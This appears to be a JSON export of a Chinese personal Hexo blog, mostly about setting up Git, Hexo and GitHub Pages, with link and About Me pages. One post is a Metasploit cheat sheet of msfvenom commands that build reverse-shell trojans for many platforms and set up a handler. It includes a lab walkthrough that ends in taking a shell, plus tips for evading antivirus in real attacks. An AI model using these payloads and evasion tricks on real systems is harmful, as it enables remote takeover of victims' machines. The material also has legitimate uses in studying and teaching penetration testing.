安装Git（第一坑）&emsp;1.网上的教程都是直接到Git官网直接下载，后来到了官网后发现官网根本就不能下载了，这不是坑人么？后来找了很多方法，发现官网已经停止维护更新了，那就得使用其他途径了。推荐淘宝镜像，或者到CSDN搜索一下复制链接给淘宝客服帮助你下载（土豪行为）🤭&emsp;2.安装好了后到命令行试试是否成功安装了，方法：打开命令行（Win+R）,输入cmd，打开命令行后输入git，如果显示有相应信息则安装成功，否则重新安装。\n\n步骤四、 使用Git创建SSH-RSA密钥复制到自己的Github仓库&emsp;注意事项：生成密钥的过程会提示是否需要输入密码？按回车默认不需要就可以了，后面一个提示是生成的密钥的文件保存路径，你可以更改也可以不改。创建方法参见：点我看视频。\n\n\n步骤五、 非常重要的一步，创建Hexo（第二坑）\n\n建立一个Blog文件夹；\n在Blog文件夹下右键选中Git Bash Here打开Git,输入更换安装源的路径命令npm install -g cnpm --registry=https://registry.npm.taobao.org，然后输入npm install hexo-cli -g-g是安装到全局；\n安装好Hexo后，接着输入hexo init Directoree“Directoree”是博客名，这一步创建博客本地站点文件；Directoree文件夹被创建好后，将其复制一份到其他路径下，方便以后用；\n到Blog/Directoree右键选中Git Bash Here打开Git,输入npm install安装依赖。\n\n\n&emsp;注意事项：Hexo创建不成功的话是无法搭建博客的，注意创建在目录的位置哦！创建方法参见：点我看视频后发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，代码参考关于HEXO安装失败的解决方法，如果连接不能跳转则使用下面代码即可：\n\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\ncnpm install hexo-cli -g\n\n&emsp;\n&emsp;注意事项：Hexo依赖不成功安装的话是无法搭建博客的，注意创建在目录的位置哦！！！发现创建失败啊。哈哈，那是因为目前国内npm源有问题，所以推荐使用淘宝镜像，使用下面代码即可：\n\nnpm config set registry https://registry.npm.taobao.org\nnpm install\n\n&emsp;安装好了后就赶紧试试自己的第一篇博客文章吧，在命令行输入：hexo g -s 本地查看一下，参见视频。\n\n步骤六、 下载安装Sublime Text软件&emsp;该软件用于编辑代码等，当然也可以使用其他软件，推荐下载地址，点击DOWNLOAD FOR WINDOWS。然后就可以编辑提交文章到自己的博客了啊。如果hexo g时报错远程端连接不上的话，是因为网络问题，多试几次就好了。常用的提交命令：\n\n\nhexo cl\nhexo g\nhexo s   （这个是本地查看）\nhexo d   （这个是部署到自己的博客）\n  哈哈哈，就这样自己的博客初步搭建好了\n  至于主题替换以及里面插件的使用后续再更吧……😊\n\n&emsp;&emsp;\n三、 搭建第二个博客创建多个博客其实按照逻辑来并不难，难点是在于远程部署文章的时候的解决方法。其实实际也就是使用本地RSA密钥要使用正确。\n\n\n\n\n注册GitHub账号；并注意这个时候的SSH-RSA密钥创建的时候我们可以另选一个路径先暂时保存一下，比如桌面；\nGit、node.js不需要再次安装；\n可以将上述复制的博客文件直接拿来用。 1）如果没有复制。则需要检查Hexo是否在新的博客路径下可用，不可用的话重新在新的路径下安装，安装方法参照上面，安装好Hexo后，接着输入hexo init Directoree“Directoree”是博客名，接着安装依赖； 2）如果复制了。需要再安装一个Hexo依赖，否则你会发现hexo cl等命令不能用。\n\n\n&emsp;&emsp;如果不解决RSA的问题报错如下：\n\n&emsp;&emsp;解决方法：部署哪一个博客就使用该博客对应的RSA密钥对！！！网上那些方法我都试了但是没有一个能解决实际情况，所以下面的解决方法绝对适用于每一个人！！！\n&emsp;保存RSA密钥的默认路径是C:\\Users\\Alvin\\.ssh，可以看到里面的id_rsa、id_rsa.pub密钥对是第一个博客的，当我们需要部署第二个博客到远程仓库时就需要使用到第二个博客的密钥对，这个时候我们可以在C:\\Users\\Alvin\\.ssh目录下建立一个文件夹，例如建立用于更换文件夹，将暂时不用的密钥对移动到里面，将需要使用到的密钥对放到C:\\Users\\Alvin\\.ssh目录下即可。&emsp;\n\n为什么要这样？那是因为密钥对可以选择使用，但是部署到远程仓库是使用的密钥对文件名字必须为id_rsa、id_rsa.pub\n\n\n\n更换后第二个博客部署成功了，如下：\n&emsp;哈哈哈哈(。・∀・)ノ\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d00794e53.jpg","plink":"https://Directoree.github.io/post/createGithubblog/"},{"title":"msfvenom生成各类Payload命令，远程木马攻击","date":"2018-11-14T14:09:28.000Z","updated":"2018-12-24T12:29:12.224Z","content":"   msfvenom生成各类Payload命令\nOften one of the most useful(and to the beginner underrated) abilities of Metasploit is the  msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address(LAN IP if  attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.\n\nLinuxmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf\n\n\nWindowsmsfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe\n\n\nMacmsfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho\n\n\n\nPHPmsfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php\n\ncat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php\n\n\nASPmsfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp\n\nJSPmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp\n\nWARmsfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war                    Scripting Payloads\n\nPythonmsfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py\n\n\nBashmsfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh\n\n\nPerlmsfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl\n\n\nShellcodeFor all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.\n\n\nLinux Based Shellcodemsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f \n\n\nWindows Based ShellcodeYour IP Address&gt; LPORT= -f  language    “language放在&lt;&gt;里”\nMac Based Shellcodemsfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f \n\nHandlers模块Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.\n\nuse exploit/multi/handler set LHOST  set LPORT  exploit -j -z Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘\n\n\n&nbsp;&nbsp;下面以一个实例说明使用方法\nMetasploit之我的远程控制软件参考文献：Metasploit渗透测试笔记(Meterpreter篇\n远程控制软件–&gt;远控后门木马程序\n木马程序–&gt;控制端（攻击者）–&gt;服务端（攻击目标）\n测试环境：攻击者：kali-linux    –&gt;192.168.2.146受害者：Windows07     –&gt;192.168.2.107\n以下为kali-linux-2.0系统下的生成与连接方式（使用msfvenom命令的）参考文献一类似文献二\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=你的ip LPORT=你的端口 -f exe -o payload.exe\n以上就是基本命令，解释一下，-p后面是payload名称，然后是你的ip和端口(payload参数)，然后是-f 格式，由于是实验就先设置exe，然后-o payload.exe指保存为payload.exe。当然，实验的时候可以把格式设置成exe，但是实战的时候毕竟有杀毒软件，所以格式最好是jar，jar就要求对方有java环境，可以用来拿java web网站的时候使用，或者设置成python然后自行shellcode免杀，即用Python容器，然后用AES混淆Python代码，再用pyinstaller编译exe，这是目前最完美的过杀毒软件方案，就连勒索软件都不会被杀毒软件干掉，除非有特殊动作，比如修改注册表。当然，楼主还有很多要学习。\n具体步骤如下：\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=44444 -f exe -o test.exe            \n\n–&gt;在当前目录下生成木马程序test.exe，PS：生成payload.exe不会被杀，test.exe被秒杀\nPS:之后的操作步骤是和上面的一样的↓\n之后在metasploit下连接后门程序，步骤如下：\nmsfconsole                  -->开启metasploit\nuse exploit/multi/handler       -->使用“exploit/multi/handler”这个模块连接后门程序\nshow options   -->查看需要设置的配置信息//这里其实不需要配置任何信息的\nset PAYLOAD windows/meterpreter/reverse_tcp    -->使用tcp反向连接\nshow options               -->查看需要设置的配置信息\nset LHOST=192.168.2.146    -->设置我们攻击者自己的连接IP\nset LPORT=44444            -->设置我们攻击浙自己的连接端口\nexploit                    -->执行连接，等待木马执行后连接\n\nPS：远程木马被执行后接着可以直接“shell”命令拿下shell\n&nbsp;&nbsp;&nbsp;&nbsp;OK，完成了！&nbsp;&nbsp;\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d111ae200.jpg","plink":"https://Directoree.github.io/post/Metasploit1/"},{"title":"Hello World","date":"2018-11-14T07:08:54.000Z","updated":"2019-03-07T07:37:37.447Z","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","plink":"https://Directoree.github.io/post/hello-world/"},{"title":"Markdown","date":"2018-11-14T05:00:45.000Z","updated":"2019-03-21T17:50:16.596Z","content":"1.Markdown在线编辑器\n2.Markdown高级语法大全\n3.Markdown高级语法\n\n\n","thumbnail":"https://i.loli.net/2018/12/24/5c20d024076bd.jpg","plink":"https://Directoree.github.io/post/MarkdownUsage/"},{"title":"404 Not Found：该页无法显示","date":"2019-03-15T12:31:14.000Z","updated":"2019-03-15T12:31:55.753Z","content":"","plink":"https://Directoree.github.io/404/"},{"title":"comment","date":"2019-03-05T09:30:36.000Z","updated":"2019-03-05T09:35:31.203Z","content":"留言给我~\n","plink":"https://Directoree.github.io/comment/"},{"title":"Notes","date":"2019-03-04T10:41:59.000Z","updated":"2019-03-04T10:54:03.375Z","content":"Pythonneed: Files、OOP、Errors and exceptions、Functional programming、Processes and threads、The graphical interface、Web programmingHTMLJavaScriptCSSPHP\n","plink":"https://Directoree.github.io/notes/"},{"title":"Resourses","date":"2018-12-23T12:38:34.000Z","updated":"2018-12-27T17:22:09.930Z","content":"&ensp; \n资源目录(点击相应资源会跳转哦).😜  &emsp; 👉资源链接.\n","plink":"https://Directoree.github.io/book/"},{"title":"Links","date":"2018-12-22T13:12:02.000Z","updated":"2019-03-25T06:44:15.363Z","content":"&emsp;&emsp;\nLearning resources\n\n跨站脚本题目推荐使用网站：   https://web2hack.org/xssee/ \n知乎CTF学习：    https://www.zhihu.com/question/30505597 \n新手CTF挑战：    http://ctf.d0g3.cn/challenges\n实验吧听课练习：   http://www.shiyanbar.com/ \n安全牛课堂： https://edu.aqniu.com/\nI春秋课堂： https://www.ichunqiu.com/\nCumtCTF: http://202.119.201.199/\nMOCTF： http://www.moctf.com/\nBugku： https://ctf.bugku.com/\nNuptCTF： http://ctf.nuptzj.cn/\n\nOthers\n\n一叶飘零： https://skysec.top\n先知社区： https://xz.aliyun.com/\n渗透师导航： https://www.shentoushi.top/\n0verWatch： https://0verwatch.top/\nComyDream： https://comydream.github.io/\n\n","plink":"https://Directoree.github.io/links/"},{"title":"About Me","date":"2018-11-18T07:12:11.000Z","updated":"2019-04-28T21:13:40.976Z","content":"\n\n一个优秀的黑阔，一定是一个牛逼的开发者。\n\n\n\n    \n\n❤安全：\n\n💧Web\n💧内网\n💧Linux\n💧Docker\n……\n\n\n喜欢喝茶☕\n\n迷粤语歌🎵\n\n爱开发🙃\n\n\n\n特别敬佩老爸😁\n\n🤞最爱music\n\n《在你遥远的附近》 \n《伤逝》 \n《半祝福》\n《别》 \n《大哥》 \n《安徒生的错》 \n\n\n\n\nEmail：zhao_yilong@aliyun.com\n\n\n","plink":"https://Directoree.github.io/about/"}]